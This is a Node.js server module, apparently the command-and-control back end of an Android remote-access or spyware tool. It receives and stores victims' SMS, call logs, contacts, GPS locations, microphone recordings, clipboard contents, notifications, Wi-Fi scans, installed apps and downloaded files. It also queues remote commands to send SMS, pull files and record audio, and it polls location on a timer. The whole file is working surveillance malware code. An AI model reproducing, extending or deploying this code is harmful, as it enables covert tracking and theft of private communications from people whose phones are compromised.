let CONST = require('./const'),
    fs = require('fs'),
    crypto = require('crypto'),
    path = require('path');

const ClientsDb = require('../models/Clients');
const ClientDataDb = require('../models/ClientData');
const {time} = require("../utils/helper");

class Clients {
    constructor(db) {
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
    }

    // UPDATE

    async clientConnect(connection, clientID, clientData,user) {

        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        //let client = this.db.maindb.get('clients').find({clientID});
        const dataOfClient = {
            clientID,
            firstSeen: new Date(),
            lastSeen: new Date(),
            isOnline: true,
            dynamicData: clientData,
            user:user
        }
        // const dataOfClientUpdate = {
        //     lastSeen: new Date(),
        //     isOnline: true,
        //     dynamicData: clientData
        // }
       //await ClientsDb.updateOne({"clientID":  clientID}, {$setOnInsert: dataOfClient}, {upsert: true});
        await ClientsDb.updateOne(
            { clientID:  clientID },
            {
                $set:dataOfClient ,
              //  $setOnInsert: dataOfClientUpdate
            },
            { upsert: true }
        )

        // if (client.value() === undefined) {
        //     this.db.maindb.get('clients').push({
        //         clientID,
        //         firstSeen: new Date(),
        //         lastSeen: new Date(),
        //         isOnline: true,
        //         dynamicData: clientData
        //     }).write()
        //
        //     // this being the first run we should ask the client for all existing data?
        //
        // } else {
        //     client.assign({
        //         lastSeen: new Date(),
        //         isOnline: true,
        //         dynamicData: clientData
        //     }).write()
        //
        // }

        let clientDatabase = await this.getClientDatabase(clientID,user);
        await this.setupListeners(clientID, clientDatabase);
    }

    async clientDisconnect(clientID,user) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            logManager.log(CONST.logTypes.info, clientID + " Disconnected",user,clientID).then()
            // this.db.maindb.get('clients').find({clientID}).assign({
            //     lastSeen: new Date(),
            //     isOnline: false,
            // }).write()

            await ClientsDb.updateOne(
                {clientID: clientID},
                {
                    $set: {
                        lastSeen: new Date(),
                        isOnline: false,
                    },

                }
            )
            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
            delete this.ignoreDisconnects[clientID];
        }
    }


    async getClientDatabase(clientID,user) {

        const updateData=user?{user}:{}

        return ClientDataDb.findOneAndUpdate(
            {clientID: clientID},
            updateData,
            {upsert: true}
        );

        // if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        // else {
        //     this.clientDatabases[clientID] = new this.db.clientdb(clientID)
        //     return this.clientDatabases[clientID];
        // }
    }

    async setupListeners(clientID) {
        let socket = this.clientConnections[clientID];
        let client = await this.getClientDatabase(clientID);

        logManager.log(CONST.logTypes.info, clientID + " Connected",client.user,clientID).then()
        socket.on('disconnect', () => this.clientDisconnect(clientID,client.user));

        // Run the queued requests for this client
        let clientQue = client.CommandQue;

        if (clientQue.length !== 0) {
            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands",client.user,clientID).then();
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, async (error) => {
                    if (!error) {
                      //  client.get('CommandQue').remove({uid: uid}).write();
                        await ClientDataDb.updateOne(
                            {clientID: clientID},
                            { $pull: { 'CommandQue': {uid} } }
                        );
                    }
                else
                    {
                        // Hopefully we'll never hit this point, it'd mean the client connected then immediately disconnected, how weird!
                        // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ
                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed",client.user,clientID).then();
                    }
                })
            })
        }


        // Start GPS polling (if enabled)
        await this.gpsPoll(clientID);


        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

        // socket.on(CONST.messageKeys.camera, (data) => {

        //     // {
        //     //     "image": <Boolean>,
        //     //     "buffer": <Buffer>
        //     // }

        //     if (data.image) {
        //         let uint8Arr = new Uint8Array(data.buffer);
        //         let binary = '';
        //         for (var i = 0; i < uint8Arr.length; i++) {
        //             binary += String.fromCharCode(uint8Arr[i]);
        //         }
        //         let base64String = window.btoa(binary);

        //         // save to file
        //         let epoch = Date.now().toString();
        //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
        //         fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
        //             if (!error) {
        //                 // let's save the filepath to the database
        //                 client.get('photos').push({
        //                     time: epoch,
        //                     path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
        //                 }).write();
        //             }
        //             else return; // not ok
        //         })
        //     }
        // });

        socket.on(CONST.messageKeys.files, async (data) => {
            // {
            //     "type": "list"|"download"|"error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String>
            // }

            if (data.type === "list") {
                let list = data.list;
                if (list.length !== 0) {
                    // cool, we have files!
                    // somehow get this array back to the main thread...
                    // client.get('currentFolder').remove().write();
                    // client.get('currentFolder').assign(data.list).write();
                    client.currentFolder.push(data.list)

                    await ClientDataDb.updateOne(
                        {clientID: clientID},
                        {currentFolder: data.list}
                    );

                    logManager.log(CONST.logTypes.success, "File List Updated",client.user,clientID).then();
                } else {
                    // bummer, something happened
                }
            } else if (data.type === "download") {
                // Ayy, time to recieve a file!
                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID,client.user,clientID).then();


                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, async (error) => {
                    if (!error) {
                        // let's save the filepath to the database

                        // client.get('downloads').push({
                        //     time: new Date(),
                        //     type: "download",
                        //     originalName: data.name,
                        //     path: CONST.downloadsFolder + '/' + fileKey + fileExt
                        // }).write();
                        const updateData={
                            time: new Date(),
                            type: "download",
                            originalName: data.name,
                            path: CONST.downloadsFolder + '/' + fileKey + fileExt
                        }
                        client.downloads.push(updateData)

                        await ClientDataDb.updateOne(
                            {clientID: clientID},
                            {$push: {downloads: updateData}}
                        );

                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved",client.user,clientID).then();
                    } else console.log(error); // not ok
                })
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        socket.on(CONST.messageKeys.call, async (data) => {
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.CallData;
                    let newCount = 0;

                    for (const call of callsList) {
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");

                        if (!dbCall.find(e => e.hash === hash) ) {
                            // cool, we dont have this call
                            call.hash = hash;
                            client.CallData.push(call)
                           // dbCall.push(call).write();
                            await ClientDataDb.updateOne(
                                {clientID: clientID},
                                {$push: {CallData: call}}
                            );

                            newCount++;
                        }
                    }
                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls",client.user,clientID).then();
                }
            }

        });

        socket.on(CONST.messageKeys.sms, async (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    let dbSMS = client.SMSData;
                    let newCount = 0;
                    for (const sms of smsList) {
                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                        if (dbSMS.find(e => e.hash === hash) === undefined) {
                            // cool, we dont have this sms
                            sms.hash = hash;
                            // dbSMS.push(sms).write();
                            client.SMSData.push(sms)
                            await ClientDataDb.updateOne(
                                {clientID: clientID},
                                {$push: {SMSData: sms}}
                            );
                            newCount++
                        }
                    }
                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages",client.user,clientID).then();
                }
            } else if (typeof data === "boolean") {
                logManager.log(CONST.logTypes.success, clientID + " SENT SMS",client.user,clientID).then();
            }
        });

        socket.on(CONST.messageKeys.mic, (data) => {
            if (data.file) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID,client.user,clientID).then();

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, async (e) => {
                    if (!e) {
                        // client.get('downloads').push({
                        //     "time": new Date(),
                        //     "type": "voiceRecord",
                        //     "originalName": data.name,
                        //     "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                        // }).write();

                        await ClientDataDb.updateOne(
                            {clientID: clientID},
                            {
                                $push: {
                                    downloads: {
                                        "time": new Date(),
                                        "type": "voiceRecord",
                                        "originalName": data.name,
                                        "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                                    }
                                }
                            }
                        );
                    } else {
                        console.log(e);
                    }
                })
            }
        });

        socket.on(CONST.messageKeys.location, async (data) => {
            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                // client.get('GPSData').push({
                //     time: new Date(),
                //     enabled: data.enabled || false,
                //     latitude: data.latitude || 0,
                //     longitude: data.longitude || 0,
                //     altitude: data.altitude || 0,
                //     accuracy: data.accuracy || 0,
                //     speed: data.speed || 0
                // }).write();

                await ClientDataDb.updateOne(
                    {clientID: clientID},
                    {$push: {GPSData: {
                                time: new Date(),
                                enabled: data.enabled || false,
                                latitude: data.latitude || 0,
                                longitude: data.longitude || 0,
                                altitude: data.altitude || 0,
                                accuracy: data.accuracy || 0,
                                speed: data.speed || 0
                            }}}
                );

                logManager.log(CONST.logTypes.success, clientID + " GPS Updated",client.user,clientID).then();
            } else {
                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data",client.user,clientID).then();
                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data),client.user,clientID).then();
            }
        });

        socket.on(CONST.messageKeys.clipboard, async (data) => {
            // client.get('clipboardLog').push({
            //     time: new Date(),
            //     content: data.text
            // }).write();
            const clipLog=client.clipboardLog

           // console.log(clipLog)
            let newCount = 0;
                let hash = crypto.createHash('md5').update(time() + data.text).digest("hex");

                if (!clipLog.find(e => e.hash === hash)) {
                    // console.log(hash)
                    // console.log({
                    //     time: time(),
                    //     content: data.text
                    // })
                   // console.log(clipLog.find(e => e.hash === hash))
                    const updateData={
                        time: new Date(),
                        content: data.text,
                        hash

                    }

                    clipLog.push(updateData)
                    await ClientDataDb.updateOne(
                        {clientID: clientID},
                        {
                            $push: {
                                clipboardLog: updateData
                            }
                        }
                    );
                    newCount++

                    logManager.log(CONST.logTypes.info, clientID + " ClipBoard Received",client.user,clientID).then();
                }


        });

        socket.on(CONST.messageKeys.notification, async (data) => {
            let dbNotificationLog = client.notificationLog;
           // console.log({dbNotificationLog})
            let hash = crypto.createHash('md5').update(data.key + data.content).digest("hex");

            if (dbNotificationLog.find(e => e.hash === hash) === undefined) {
                data.hash = hash;
                // Updating in db
                await ClientDataDb.updateOne(
                    {clientID: clientID},
                    { $push: {notificationLog:data} }
                );

                client.notificationLog.push(data)
               // dbNotificationLog.push(data).write();
                logManager.log(CONST.logTypes.info, clientID + " Notification Received",client.user,clientID).then();
            }
        });

        socket.on(CONST.messageKeys.contacts, async (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.contacts;
                    let newCount = 0;
                    for (const contact of contactsList) {
                        contact.phoneNo = encodeURI(
                            contact.phoneNo
                                .replace(/[^\w\s]/gi, "")
                                .replace(/\s/g, "")
                                .toLowerCase()
                        );
                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");

                        if (dbContacts.find(e => e.hash === hash) === undefined) {
                            // cool, we dont have this call
                            contact.hash = hash;
                            client.contacts.push(contact)
                            //  dbContacts.push(contact).write();
                            await ClientDataDb.updateOne(
                                {clientID: clientID},
                                {$push: {contacts: contact}}
                            );
                            newCount++;
                        }
                    }
                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added",client.user,clientID).then();
                }
            }

        });

        socket.on(CONST.messageKeys.wifi, async (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    let networks = data.networks;
                    let dbwifiLog = client.wifiLog;
                    // client.get('wifiNow').remove().write();
                    // client.get('wifiNow').assign(data.networks).write();
                    await ClientDataDb.updateOne(
                        {clientID: clientID},
                        {wifiNow: data.networks}
                    );
                    let newCount = 0;
                    for (const wifi of networks) {
                        //let wifiField = dbwifiLog.find({SSID: wifi.SSID, BSSID: wifi.BSSID});
                        let wifiField = dbwifiLog.find(e => e.SSID === wifi.SSID && e.BSSID === wifi.BSSID);

                        if (wifiField=== undefined) {
                            // cool, we dont have this call
                            wifi.firstSeen = new Date();
                            wifi.lastSeen = new Date();
                            client.wifiLog.push(wifi)
                           // dbwifiLog.push(wifi).write();
                            await ClientDataDb.updateOne(
                                {clientID: clientID},
                                {$push: {wifiNow: wifi}}
                            );
                            newCount++;
                        } else {
                            // wifiField.assign({
                            //     lastSeen: new Date()
                            // }).write();
                            await ClientDataDb.updateOne(
                                {clientID: clientID},
                                {$push: {wifiNow: {lastSeen: new Date()}}}
                            );
                        }
                    }
                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found",client.user,clientID).then();
                }
            }
        });

        socket.on(CONST.messageKeys.permissions, async (data) => {
           // client.get('enabledPermissions').assign(data.permissions).write();
            await ClientDataDb.updateOne(
                {clientID: clientID},
                {$push: {enabledPermissions: data.permissions}}
            );
            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated",client.user,clientID).then();
        });

        socket.on(CONST.messageKeys.installed, async (data) => {
         //   client.get('apps').assign(data.apps).write();
            await ClientDataDb.updateOne(
                {clientID: clientID},
                {$push: {apps:  data.apps}}
            );
            logManager.log(CONST.logTypes.success, clientID + " Apps Updated",client.user,clientID).then();
        });
    }


    // GET
    getClient(clientID) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    // getClientList() {
    //     return this.db.maindb.get('clients').value();
    // }
    //
    // getClientListOnline() {
    //     return this.db.maindb.get('clients').value().filter(client => client.isOnline);
    // }
    // getClientListOffline() {
    //     return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
    // }

    async getClientDataByPage(clientID, page, filter = undefined,user) {
       // let client = db.maindb.get('clients').find({clientID}).value();

        const client = await ClientsDb.findOne({clientID,user})

        if (client !== undefined) {
            let clientDB = await this.getClientDatabase(client.clientID);
            const clientData =clientDB

            let pageData;

            if (page === "calls") {
                const array=clientDB.CallData

                pageData = array.sort((a, b) => b.date - a.date) ;
                if (filter) {
                    let filterData = array.sort((a, b) => b.date - a.date).filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            } else if (page === "sms") {
                pageData = clientData.SMSData;
                const array=clientDB.SMSData
                if (filter) {
                    let filterData = array.filter(sms => sms.address.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }

            } else if (page === "notifications") {
                const array=clientDB.notificationLog
                pageData = array.sort((a, b) => b.postTime - a.postTime);
                if (filter) {
                     let  filterData = array.sort((a, b) => b.postTime - a.postTime).filter(not => not.appName === filter);

                    if (filterData) pageData = filterData;
                }
            } else if (page === "wifi") {
                pageData = {};
                pageData.now = clientData.wifiNow;
                pageData.log = clientData.wifiLog;
            } else if (page === "contacts") pageData = clientData.contacts;
            else if (page === "permissions") pageData = clientData.enabledPermissions;
            else if (page === "clipboard") pageData =  clientDB.clipboardLog.sort((a, b) => b.time - a.time);
            else if (page === "apps") pageData = clientData.apps;
            else if (page === "files") pageData = clientData.currentFolder;
            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
            else if (page === "microphone") pageData = clientDB.downloads.filter(download => download.type === "voiceRecord");
            else if (page === "gps") pageData = clientData.GPSData;
            else if (page === "info") pageData = client;

            return pageData;
        } else return false;
    }

    // DELETE
    deleteClient(clientID) {
        this.db.get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }

    // COMMAND
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, async (error) => {
            if (!error) {

               // let client = this.db.maindb.get('clients').find({clientID}).value();
                const client = await ClientsDb.findOne({clientID})
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID,client.user,clientID).then();
                        socket.emit('order', commandPayload)
                        return cb(false, 'Requested');
                    } else {
                        await this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)')
                            else return cb(error, undefined)
                        })
                    }
                } else return cb('Client Doesn\'t exist!', undefined);
            } else return cb(error, undefined);
        });
    }

    async queCommand(clientID, commandPayload, cb) {

        let clientDB = await this.getClientDatabase(clientID);
        let commandQue = clientDB.CommandQue;

        let outstandingCommands = [];
        commandQue.forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
        else {
            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
            commandPayload.uid = Math.floor(Math.random() * 10000);
            //console.log(commandPayload)

           await ClientDataDb.updateOne(
               {clientID: clientID},
               { $push: {CommandQue:commandPayload} }
           )
          //  commandQue.push(commandPayload).write();
            return cb(false)
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === CONST.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.mic) {
            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.gotPermission) {
            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
            else cb(false)
        }
        else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
        else return cb('Command ID Not Found');
    }

    async gpsPoll(clientID) {
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

        let clientDB = await this.getClientDatabase(clientID);
        let gpsSettings = clientDB.GPSSettings;

        if (gpsSettings.updateFrequency > 0) {
            this.gpsPollers[clientID] = setInterval(() => {
                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS",clientDB.user,clientID).then();
                this.sendCommand(clientID, '0xLO')
            }, gpsSettings.updateFrequency * 1000);
        }
    }

    async setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = await this.getClientDatabase(clientID);
            //clientDB.get('GPSSettings').assign({updateFrequency: pollevery}).write();
            await ClientDataDb.updateOne(
                {clientID: clientID},
                { $push: {GPSSettings:{updateFrequency: pollevery}} }
            )
            cb(false);
            this.gpsPoll(clientID).then();
        } else return cb('Polling Too Short!')

    }
}

module.exports = Clients;
